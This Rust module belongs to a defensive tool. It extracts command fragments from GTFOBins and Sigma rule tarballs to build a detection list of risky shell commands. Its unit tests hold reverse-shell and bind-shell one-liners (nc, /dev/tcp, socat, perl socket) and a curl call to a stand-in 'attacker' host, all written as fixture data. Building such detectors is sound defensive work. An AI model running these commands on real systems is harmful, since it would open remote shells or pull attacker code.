#![cfg(feature = "atoms-fetch")]

use std::collections::BTreeSet;
use std::io::Read;
use std::path::Path;

use super::FetchError;

/// Generic tarball walker: filter entries by `pred`, parse each
/// matching file via `extract`. Decompresses gz once, streams
/// entries. Same shape every source needs. Predicates take
/// `&Path + EntryType` so they don't depend on the tar reader's
/// generic type parameter.
pub(super) fn walk_tarball_atoms(
    gz_bytes: &[u8],
    pred: fn(&std::path::Path, tar::EntryType) -> bool,
    extract: fn(&str, &mut BTreeSet<String>),
) -> Result<Vec<String>, FetchError> {
    let gz = flate2::read::GzDecoder::new(gz_bytes);
    let mut ar = tar::Archive::new(gz);
    let mut atoms: BTreeSet<String> = BTreeSet::new();
    // Cap accumulation DURING the walk, not just after: the outer
    // download cap is on compressed bytes, and the per-entry cap is
    // per-file, so a compromised upstream could ship many entries (or
    // many distinct short atom lines) that balloon the in-memory set to
    // GBs before the post-walk count cap is consulted. Bail early on
    // either cumulative decompressed bytes or the atom count.
    const TOTAL_DECOMPRESSED_MAX: u64 = 64 * 1024 * 1024;
    let mut total_bytes: u64 = 0;

    for entry in ar
        .entries()
        .map_err(|e| FetchError::DecompressError(e.to_string()))?
    {
        let mut entry = entry.map_err(|e| FetchError::DecompressError(e.to_string()))?;
        let path = match entry.path() {
            Ok(p) => p.into_owned(),
            Err(_) => continue,
        };
        let etype = entry.header().entry_type();
        if !pred(&path, etype) {
            continue;
        }
        // Per-entry decompressed cap: the outer 32 MiB cap is
        // on compressed bytes, so a compromised upstream could
        // ship one entry that decompresses to gigabytes.
        // 4 MiB is generous for any rule manifest (real GTFOBins
        // / Sigma files are ~10-50 KiB) but bounds the OOM
        // vector. take(N).read_to_string truncates on overflow
        // — accept the truncated content (extract still parses
        // valid rules from the prefix) and continue.
        const PER_ENTRY_MAX_BYTES: u64 = 4 * 1024 * 1024;
        let mut content = String::new();
        if std::io::Read::take(&mut entry, PER_ENTRY_MAX_BYTES)
            .read_to_string(&mut content)
            .is_err()
        {
            continue;
        }
        total_bytes += content.len() as u64;
        if total_bytes > TOTAL_DECOMPRESSED_MAX {
            return Err(FetchError::DecompressError(format!(
                "tarball decompressed content exceeds {TOTAL_DECOMPRESSED_MAX} bytes — refusing"
            )));
        }
        extract(&content, &mut atoms);
        if atoms.len() > super::fetch::MAX_ATOMS_TOTAL {
            return Err(FetchError::ParseError(format!(
                "atom count exceeded cap {} during extraction — refusing",
                super::fetch::MAX_ATOMS_TOTAL
            )));
        }
    }
    Ok(atoms.into_iter().collect())
}

/// Returns true when the tarball entry is one of GTFOBins's
/// per-binary manifest files. Real layout:
/// `GTFOBins.github.io-master/_gtfobins/<binary>` — no
/// extension, no nested directories under `_gtfobins/`.
///
/// Filtering on path shape (rather than file extension) is
/// load-bearing: the original `.md` filter rejected every
/// real GTFOBins entry, so the fetcher silently wrote zero
/// atoms while unit tests bypassing the path filter passed.
pub(super) fn is_gtfobins_entry_file(path: &std::path::Path, etype: tar::EntryType) -> bool {
    if !etype.is_file() {
        return false;
    }
    let Some(parent) = path.parent() else {
        return false;
    };
    // Need: parent ends with `_gtfobins`. Reject the rare entry
    // that nests further (e.g. `_gtfobins/subdir/foo`).
    parent
        .file_name()
        .map(|n| n == std::ffi::OsStr::new("_gtfobins"))
        .unwrap_or(false)
}

/// Layout: `sigma-master/rules/linux/<category>/<rule>.yml`.
/// Other top-level `rules/` directories (windows / macos /
/// network / etc.) are skipped — Linux corpus only.
pub(super) fn is_sigma_linux_rule(path: &std::path::Path, etype: tar::EntryType) -> bool {
    if !etype.is_file() {
        return false;
    }
    let path_str = path.to_string_lossy();
    path_str.contains("/rules/linux/") && path_str.ends_with(".yml")
}

/// Parse one GTFOBins markdown file's YAML front-matter and
/// pull command fragments. The file shape is:
/// ```text
/// ---
/// functions:
///   shell:
///     - code: |
///         <command>
/// ---
/// ```
/// We extract every `code` scalar, take its first line, trim.
/// Atom rules (≥3 chars, no leading `#`) apply at write time.
pub(super) fn extract_gtfobins_atoms(content: &str, atoms: &mut BTreeSet<String>) {
    // Front-matter starts with `---\n`. Upstream GTFOBins files
    // (verified 2026-05-19 on GTFOBins/GTFOBins.github.io@master)
    // are PURE YAML wrapped in a leading `---\n` — there's no
    // closing fence, and the rest of the file is the structured
    // YAML body Jekyll renders. The earlier "require closing
    // fence" check produced 0 atoms across the entire corpus
    // because the close marker never existed. Now: strip the
    // leading fence, treat the rest as YAML. If a closing
    // `\n---\n` IS present (e.g. a future file with trailing
    // prose), truncate at it.
    let stripped = content
        .strip_prefix("---\n")
        .or_else(|| content.strip_prefix("---\r\n"));
    let Some(rest) = stripped else { return };
    let yaml = if let Some(at) = rest.find("\n---\n") {
        &rest[..at]
    } else if let Some(at) = rest.find("\n---\r\n") {
        &rest[..at]
    } else {
        rest
    };
    let parsed: serde_yaml::Value = match serde_yaml::from_str(yaml) {
        Ok(v) => v,
        Err(_) => return,
    };
    let funcs = match parsed.get("functions").and_then(|f| f.as_mapping()) {
        Some(m) => m,
        None => return,
    };
    for (_func_name, func_val) in funcs {
        let arr = match func_val.as_sequence() {
            Some(a) => a,
            None => continue,
        };
        for entry in arr {
            let code = match entry.get("code").and_then(|c| c.as_str()) {
                Some(s) => s,
                None => continue,
            };
            if let Some(atom) = atom_from_code(code) {
                atoms.insert(atom);
            }
        }
    }
}

/// Parse one Sigma rule YAML. Sigma's `detection.<selector>`
/// is a mapping whose keys may carry modifier suffixes
/// (`CommandLine|contains`, `Image|endswith`, etc.). The
/// `|contains` variant is the most atom-shaped — substring
/// patterns the rule author wants to match in process events.
/// We harvest the values from those keys; everything else
/// (regex via `|re`, exact-match keys, the `condition` field)
/// is skipped.
pub(super) fn extract_sigma_atoms(content: &str, atoms: &mut BTreeSet<String>) {
    let parsed: serde_yaml::Value = match serde_yaml::from_str(content) {
        Ok(v) => v,
        Err(_) => return,
    };
    let Some(detection) = parsed.get("detection").and_then(|d| d.as_mapping()) else {
        return;
    };
    for (sel_key, sel_val) in detection {
        // Skip the `condition` field; everything else is a
        // selector block (mapping of `key|modifier -> value`).
        if sel_key.as_str() == Some("condition") {
            continue;
        }
        let Some(sel_map) = sel_val.as_mapping() else {
            continue;
        };
        for (k, v) in sel_map {
            let Some(ks) = k.as_str() else { continue };
            if !ks.contains("|contains") {
                continue;
            }
            // Value is either a single string or a list of
            // strings. Both flow through `atom_from_code`'s
            // first-non-blank-line + length rules.
            if let Some(s) = v.as_str() {
                if let Some(atom) = atom_from_code(s) {
                    atoms.insert(atom);
                }
            } else if let Some(seq) = v.as_sequence() {
                for v in seq {
                    if let Some(s) = v.as_str() {
                        if let Some(atom) = atom_from_code(s) {
                            atoms.insert(atom);
                        }
                    }
                }
            }
        }
    }
}

/// Max atom length the GTFOBins fetcher will emit. Longer
/// fragments are higher-signal (full perl/python reverse-shell
/// one-liners run 100-250 chars) — keeping them is the whole
/// point of including GTFOBins. The original 60-char ceiling
/// was too restrictive and dropped the most diagnostic atoms.
/// The AC scan cost is O(haystack) and effectively independent
/// of pattern length, so longer atoms don't slow matching.
pub(super) const ATOM_MAX_LEN: usize = 200;
pub(super) const ATOM_MIN_LEN: usize = 3;

/// Turn a GTFOBins / Sigma `code` scalar into a single atom string.
/// We take the first non-blank line, strip leading whitespace
/// (markdown YAML scalars carry indentation), refuse atoms below
/// the min or above the max length (too short = noise; too long
/// = better suited to a regex anyway), and refuse placeholder-
/// shaped atoms (see `is_placeholder_atom`).
pub(super) fn atom_from_code(code: &str) -> Option<String> {
    for line in code.lines() {
        let t = line.trim();
        if t.is_empty() {
            continue;
        }
        // Drop trailing `# example` comments — they're docs,
        // not atom content. Trim AFTER comment strip because
        // the strip can leave trailing spaces.
        let clean_str = match t.find(" #") {
            Some(i) => &t[..i],
            None => t,
        };
        let clean = clean_str.trim();
        if clean.len() < ATOM_MIN_LEN || clean.len() > ATOM_MAX_LEN {
            return None;
        }
        // A leading `#` would be silently dropped by the loader's
        // whole-line-comment stripper (trust_store reads the written
        // file), so an extracted `#…` atom vanishes — reject at
        // extraction instead of writing a dead line.
        if clean.starts_with('#') {
            return None;
        }
        if is_placeholder_atom(clean) {
            return None;
        }
        if is_low_value_atom(clean) {
            return None;
        }
        return Some(clean.to_owned());
    }
    None
}

/// Sigma rule authors write `CommandLine|contains` values with
/// rule-format placeholders like `/path/to/output-file` (any
/// path), `{PATH:.exe}` (any .exe path), `{PATH_ABSOLUTE:.dll}`
/// (any .dll absolute path), or angle-bracket templates like
/// `<hostname>` / `<username>`. SIEM consumers translate these
/// to wildcards at detection time. Aho-Corasick treats them as
/// literals, so they match exactly the placeholder string and
/// nothing else — dead weight in the automaton.
///
/// Chain semantics are preserved: a typical Sigma rule lists
/// MULTIPLE substrings (e.g. `["curl ", " -o /tmp/",
/// "/path/to/output-file"]`), each extracted as its own atom.
/// Dropping the placeholder atom doesn't reduce the rule's
/// detection capability because the placeholder never fired
/// anyway — the other two literal atoms carry the signal via
/// V2-J multi-hit accumulation.
/// Reject over-broad fetched atoms that would Warn-flood. A
/// substring atom is matched literally against every command, so a
/// bare common command name (`ls`, `cd`, `git`, …) or a tiny
/// structureless token would flag nearly everything the user types —
/// usability-DoS that also trains users to dismiss the banner. Only
/// the FETCHED corpus passes through here; the bundled
/// `flagged_atoms.txt` is curated and loaded directly. Multi-token
/// atoms (`curl -fsSL`, `nc -e /bin/sh`) keep their signal and pass.
fn is_low_value_atom(atom: &str) -> bool {
    // Multi-token atoms carry context — keep them.
    if atom.chars().any(char::is_whitespace) {
        return false;
    }
    const COMMON_COMMANDS: &[&str] = &[
        "ls", "cd", "cp", "mv", "rm", "cat", "echo", "pwd", "env", "set", "git", "ssh", "scp",
        "top", "ps", "df", "du", "man", "vi", "vim", "nano", "npm", "pip", "cargo", "make", "sudo",
        "sh", "bash", "zsh", "tar", "gzip", "curl", "wget", "grep", "sed", "awk", "find", "kill",
        "chmod", "chown", "export", "source", "which", "whoami", "ln", "touch", "mkdir",
    ];
    let lower = atom.to_ascii_lowercase();
    if COMMON_COMMANDS.contains(&lower.as_str()) {
        return true;
    }
    // A very short single token with no shell structure (no path/flag/
    // operator char) is unlikely to be a useful IOC and risks broad
    // matches. Floor at < 5 (not < 6) so 5-char malware binary names
    // like `xmrig` still pass — the goal is to drop generic 3-4 char
    // noise, not real short IOC tokens.
    let has_structure = atom
        .chars()
        .any(|c| matches!(c, '/' | '-' | '|' | '=' | '.' | ':' | '$' | '(' | ';'));
    atom.len() < 5 && !has_structure
}

fn is_placeholder_atom(atom: &str) -> bool {
    // Delegate to the always-available top-level fn so the
    // predicate is shared between the atom-fetcher's extract
    // path and the trust_store's `atoms add` validator —
    // operators can't sneak placeholder-shaped atoms into the
    // user overlay any more than the fetcher would accept them.
    super::is_placeholder_atom_public(atom)
}

/// Atomic write: tmp file in the same dir + rename. Reader
/// (the AtomMatcher loader) never sees a half-written file.
pub(super) fn write_atoms(path: &Path, atoms: &BTreeSet<String>) -> Result<(), FetchError> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| FetchError::WriteError(format!("mkdir -p {parent:?}: {e}")))?;
    }
    // PID-suffixed tmp name + create_new so we don't follow a
    // pre-planted symlink at a predictable tmp path and two daemon
    // instances don't race the same slot. Mirrors atom_drift's
    // write_snapshot / trust_store's write_atomic.
    let pid = std::process::id();
    let tmp = match path.file_name().and_then(|n| n.to_str()) {
        Some(n) => path.with_file_name(format!("{n}.tmp.{pid}")),
        None => path.with_file_name(format!("atoms.system.txt.tmp.{pid}")),
    };
    let header = "# atty-guard auto-fetched atom set (atoms.system.txt).\n# Generated by `atty-guard --update-atoms-now` (or the daemon's\n# `--atoms-update-interval` cron mode). Do NOT hand-edit —\n# changes get overwritten on next refresh. The bundled\n# `flagged_atoms.txt` (in the atty repo, compile-time embedded)\n# stays the always-on baseline; this file is the daemon's\n# runtime overlay loaded with a permission gate (must be atty-\n# owned, no group/world-write). Lives at $STATE_DIRECTORY/, i.e.\n# /var/lib/atty-guard/atoms.system.txt on the system daemon.\n";
    let mut content = String::with_capacity(header.len() + atoms.len() * 32);
    content.push_str(header);
    for a in atoms {
        content.push_str(a);
        content.push('\n');
    }
    {
        use std::io::Write;
        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create_new(true);
        // Create the tmp already at 0640 (subject to umask, which can
        // only restrict) so there's no window where it's world-readable
        // before the chmod below — closes the gap on a world-readable
        // parent dir.
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            opts.mode(0o640);
        }
        let mut f = opts
            .open(&tmp)
            .map_err(|e| FetchError::WriteError(format!("create {tmp:?}: {e}")))?;
        f.write_all(content.as_bytes())
            .map_err(|e| FetchError::WriteError(format!("write {tmp:?}: {e}")))?;
        // Re-assert exactly 0640 (owner-write, group-read, no world
        // access) before rename — a restrictive umask could have
        // narrowed the create mode; this brings it to the loader's
        // required posture. Unlike atom_drift::write_snapshot
        // (telemetry, which only WARNS on a chmod failure), this is a
        // security-loaded corpus, so a chmod failure fails the whole
        // fetch closed — keep the last-good file rather than publish one
        // with unknown perms. Do NOT "make them consistent" with a warn.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o640))
                .map_err(|e| FetchError::WriteError(format!("chmod 0640 {tmp:?}: {e}")))?;
        }
    }
    std::fs::rename(&tmp, path)
        .map_err(|e| FetchError::WriteError(format!("rename → {path:?}: {e}")))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn atom_from_code_picks_first_nonblank_line() {
        let code = "\n\nnc -e /bin/sh ATTACKER PORT\n";
        assert_eq!(
            atom_from_code(code).as_deref(),
            Some("nc -e /bin/sh ATTACKER PORT")
        );
    }

    #[test]
    fn atom_from_code_strips_trailing_doc_comment() {
        let code = "bash -i  # spawn an interactive shell";
        assert_eq!(atom_from_code(code).as_deref(), Some("bash -i"));
    }

    #[test]
    fn atom_from_code_rejects_too_long() {
        // Past the ATOM_MAX_LEN ceiling — anything bigger
        // belongs in a regex rule, not an atom.
        let s = "a".repeat(ATOM_MAX_LEN + 1);
        assert!(atom_from_code(&s).is_none());
    }

    #[test]
    fn atom_from_code_accepts_realistic_gtfobins_oneliner() {
        // Real GTFOBins entries run 100-250 chars — keeping
        // them is the whole point of including the corpus.
        // This length sat above the original 60-char ceiling.
        let perl_one_liner = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'";
        // Sanity: the example is between min and max.
        assert!(perl_one_liner.len() > 60);
        assert!(perl_one_liner.len() <= ATOM_MAX_LEN);
        assert_eq!(
            atom_from_code(perl_one_liner).as_deref(),
            Some(perl_one_liner)
        );
    }

    #[test]
    fn atom_from_code_rejects_too_short() {
        assert!(atom_from_code("hi").is_none());
    }

    #[test]
    fn atom_from_code_rejects_sigma_path_placeholder() {
        // Sigma rule authoring convention — `/path/to/...` is a
        // template literal that matches nothing in real input.
        assert!(atom_from_code("uniq /path/to/input-file").is_none());
        assert!(atom_from_code("emacs /path/to/output-file").is_none());
    }

    #[test]
    fn atom_from_code_rejects_path_template_placeholders() {
        // LOLBAS-style templates appear in Sigma rules derived
        // from LOLBAS metadata too.
        assert!(atom_from_code("script {PATH:.exe} arg").is_none());
        assert!(atom_from_code("loader {PATH_ABSOLUTE:.dll}").is_none());
    }

    #[test]
    fn atom_from_code_rejects_angle_bracket_placeholders() {
        assert!(atom_from_code("ssh <hostname>").is_none());
        assert!(atom_from_code("connect <user>@<host>").is_none());
        // Real angle-bracket usage (redirection, comparison) keeps
        // a non-identifier between the brackets — should pass.
        assert!(atom_from_code("bash -i >& /dev/tcp/x/4444").is_some());
        assert!(atom_from_code("cmd 2>&1 < input.txt").is_some());
    }

    #[test]
    fn extract_gtfobins_parses_canonical_yaml() {
        // Minimal example modelled after the real GTFOBins
        // front-matter shape.
        let doc = r#"---
description: "demo"
functions:
  shell:
    - code: |
        nc -e /bin/sh 10.0.0.1 4444
    - code: |
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  reverse-shell:
    - code: |
        socat - tcp:10.0.0.1:4444 exec:bash
---
# rest of markdown
"#;
        let mut atoms = BTreeSet::new();
        extract_gtfobins_atoms(doc, &mut atoms);
        assert!(atoms.iter().any(|a| a.contains("nc -e")));
        assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
        assert!(atoms.iter().any(|a| a.starts_with("socat")));
    }

    #[test]
    fn extract_sigma_parses_command_line_contains() {
        let doc = r#"
title: Demo reverse shell detection
detection:
  selection_nc:
    CommandLine|contains:
      - 'nc -e /bin/sh'
      - '/dev/tcp/'
  selection_curl:
    CommandLine|contains: 'curl -fsSL http://attacker'
  filter:
    Image|endswith: '/usr/bin/git'
  condition: selection_nc or selection_curl
"#;
        let mut atoms = BTreeSet::new();
        extract_sigma_atoms(doc, &mut atoms);
        assert!(atoms.iter().any(|a| a.contains("nc -e")));
        assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
        assert!(atoms.iter().any(|a| a.contains("curl -fsSL")));
        // |endswith selector is NOT a |contains atom — filtered.
        assert!(!atoms.iter().any(|a| a.contains("/usr/bin/git")));
    }

    #[test]
    fn extract_sigma_handles_no_detection_block() {
        // Defensive: rules without a `detection` mapping (e.g.
        // metadata-only files) yield zero atoms cleanly.
        let doc = "title: nothing here\nauthor: anon\n";
        let mut atoms = BTreeSet::new();
        extract_sigma_atoms(doc, &mut atoms);
        assert!(atoms.is_empty());
    }

    #[test]
    fn is_sigma_linux_rule_matches_only_linux_subtree() {
        use std::path::Path;
        let f = tar::EntryType::Regular;
        let d = tar::EntryType::Directory;
        assert!(is_sigma_linux_rule(
            Path::new("sigma-master/rules/linux/lateral_movement/foo.yml"),
            f
        ));
        assert!(!is_sigma_linux_rule(
            Path::new("sigma-master/rules/linux/x"),
            d
        )); // not a file
        assert!(!is_sigma_linux_rule(
            Path::new("sigma-master/rules/windows/persist.yml"),
            f
        )); // wrong OS
        assert!(!is_sigma_linux_rule(
            Path::new("sigma-master/rules/linux/readme.md"),
            f
        )); // wrong ext
    }

    #[test]
    fn extractors_handle_malformed_yaml_cleanly() {
        // Sigma parser must NOT panic on malformed YAML — returns
        // zero atoms via the early Err arm in `serde_yaml::from_str`.
        let mut atoms = BTreeSet::new();
        extract_sigma_atoms("not: [valid: yaml", &mut atoms);
        assert!(atoms.is_empty());
        // Also: empty input.
        extract_sigma_atoms("", &mut atoms);
        assert!(atoms.is_empty());
    }

    #[test]
    fn extract_gtfobins_handles_missing_close_fence() {
        // Upstream GTFOBins files have ONLY a leading `---\n`
        // fence — no closing one. The whole file is YAML. The
        // earlier "require closing fence" check produced 0
        // atoms across the entire corpus (the bug this commit
        // also fixes). Now: leading fence stripped, rest parsed
        // as YAML, atoms emitted.
        let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n  bind-shell:\n  - code: nc -l -p 12345 -e /bin/sh\n";
        let mut atoms = BTreeSet::new();
        extract_gtfobins_atoms(doc, &mut atoms);
        assert!(
            !atoms.is_empty(),
            "expected atoms from a no-close-fence file, got none"
        );
        assert!(
            atoms.iter().any(|a| a.contains("nc")),
            "expected an nc-related atom, got {atoms:?}"
        );
    }

    #[test]
    fn extract_gtfobins_handles_close_fence_when_present() {
        // Future-proof: if a GTFOBins file ever grows trailing
        // prose after a closing `---` fence, truncate at the
        // fence rather than handing the prose to serde_yaml.
        let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n---\nPost-fence prose that isn't YAML.\n";
        let mut atoms = BTreeSet::new();
        extract_gtfobins_atoms(doc, &mut atoms);
        assert!(
            !atoms.is_empty(),
            "expected atoms when prose follows close fence"
        );
    }

    #[test]
    fn write_atoms_roundtrips_via_tmp_rename() {
        let dir = std::env::temp_dir().join(format!("atty-guard-fetcher-{}", std::process::id()));
        let path = dir.join("atoms.system.txt");
        let mut s = BTreeSet::new();
        s.insert("nc -e /bin/sh".to_owned());
        s.insert("/dev/tcp/".to_owned());
        write_atoms(&path, &s).unwrap();
        let read = std::fs::read_to_string(&path).unwrap();
        assert!(read.contains("nc -e"));
        assert!(read.contains("/dev/tcp/"));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    #[cfg(unix)]
    fn write_atoms_sets_0640_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("atty-guard-perms-{}", std::process::id()));
        let path = dir.join("atoms.system.txt");
        let mut s = BTreeSet::new();
        s.insert("nc -e /bin/sh".to_owned());
        write_atoms(&path, &s).unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o640, "atoms.system.txt must be 0640, got {mode:o}");
        // No leftover tmp.
        let tmp = path.with_file_name(format!("atoms.system.txt.tmp.{}", std::process::id()));
        assert!(!tmp.exists(), "tmp file should be renamed away");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn atom_from_code_rejects_hash_leading() {
        // A `#`-leading atom would be silently dropped by the loader's
        // whole-line-comment stripper, so reject it at extraction.
        assert_eq!(atom_from_code("#!/bin/sh -c evil"), None);
        assert_eq!(atom_from_code("# a comment-shaped line"), None);
    }

    #[test]
    fn atom_from_code_rejects_low_value_bare_commands() {
        // Bare common command names + tiny structureless tokens would
        // Warn-flood; only multi-token / structured atoms survive.
        assert_eq!(atom_from_code("ls"), None);
        assert_eq!(atom_from_code("cd"), None);
        assert_eq!(atom_from_code("git"), None);
        assert_eq!(atom_from_code("curl"), None);
        assert_eq!(atom_from_code("abc"), None); // short, no structure
                                                 // Structured / multi-token atoms still pass.
        assert_eq!(
            atom_from_code("nc -e /bin/sh"),
            Some("nc -e /bin/sh".to_owned())
        );
        assert_eq!(atom_from_code("/dev/tcp/"), Some("/dev/tcp/".to_owned()));
        assert_eq!(atom_from_code("curl -fsSL"), Some("curl -fsSL".to_owned()));
    }

    fn accept_all(_p: &std::path::Path, _t: tar::EntryType) -> bool {
        true
    }

    fn flood_extract(_content: &str, atoms: &mut BTreeSet<String>) {
        for i in 0..(super::super::fetch::MAX_ATOMS_TOTAL + 50) {
            atoms.insert(format!("flood-atom-{i}"));
        }
    }

    #[test]
    fn walk_bails_when_atom_count_exceeds_cap() {
        // Build a 1-entry gz tarball; the flood extractor pushes the set
        // past MAX_ATOMS_TOTAL on that entry, so the in-loop cap must
        // bail (instead of accumulating unbounded then capping after).
        let mut tar_buf = Vec::new();
        {
            let mut b = tar::Builder::new(&mut tar_buf);
            let data = b"hello";
            let mut hdr = tar::Header::new_gnu();
            hdr.set_size(data.len() as u64);
            hdr.set_cksum();
            b.append_data(&mut hdr, "x", &data[..]).unwrap();
            b.finish().unwrap();
        }
        let mut gz = Vec::new();
        {
            use std::io::Write;
            let mut enc = flate2::write::GzEncoder::new(&mut gz, flate2::Compression::default());
            enc.write_all(&tar_buf).unwrap();
            enc.finish().unwrap();
        }
        let res = walk_tarball_atoms(&gz, accept_all, flood_extract);
        assert!(
            res.is_err(),
            "expected the atom-count cap to bail, got {res:?}"
        );
    }
}
